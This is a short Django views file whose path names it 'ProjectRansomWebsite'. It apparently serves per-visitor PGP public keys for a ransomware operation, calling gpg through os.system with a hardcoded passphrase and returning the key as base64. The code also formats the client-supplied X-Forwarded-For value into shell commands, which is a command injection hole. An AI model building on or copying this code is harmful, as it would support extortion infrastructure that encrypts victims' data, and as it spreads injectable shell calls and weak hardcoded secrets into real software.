from django.shortcuts import render
from django.http import JsonResponse
from django.http import HttpResponse,Http404
import os
import random
import base64

def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[-1].strip()
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

def create_public_and_private_key(password,username,gmail,save_directory,export_public=True,export_private=True):
    os.system("gpg --quick-gen-key --batch --passphrase '{}' {}".format(password,gmail))
    os.system("gpg --batch --passphrase '{}' --pinentry-mode=loopback --output /home/ains-username/Documents/ProjectRansomWebsite/certs/{}__private.pgp --armor --export-secret-key {}".format(password,username,gmail)) 
    os.system("gpg --output /home/ains-username/Documents/ProjectRansomWebsite/certs/{}__publica.asc --armor --export {}".format(username,gmail))
    
    return "/home/ains-username/Documents/ProjectRansomWebsite/certs/{}__publica.asc".format(username),"/home/ains-username/Documents/ProjectRansomWebsite/certs/{}__private.pgp".format(username)


def index_view(request):
    context = {
            'test' : "test",
    }
    ipaddrclient = get_client_ip(request)
    
    username = str(ipaddrclient) + "#"+ str(random.randint(500,9999)) 
    
    public_key,private_key = create_public_and_private_key("123456",username,str(ipaddrclient) + "#"+ str(random.randint(500,9999))+ "@gmail.com","",True,True)
    with open(public_key, 'rb') as file:
        public_key_data_bytes = file.read()
        public_key_data_base64 = base64.b64encode(public_key_data_bytes).decode('utf-8')

    print(public_key_data_base64)
    return JsonResponse({'key':public_key_data_base64})
    #return render(request,'web/index.html',context=context)

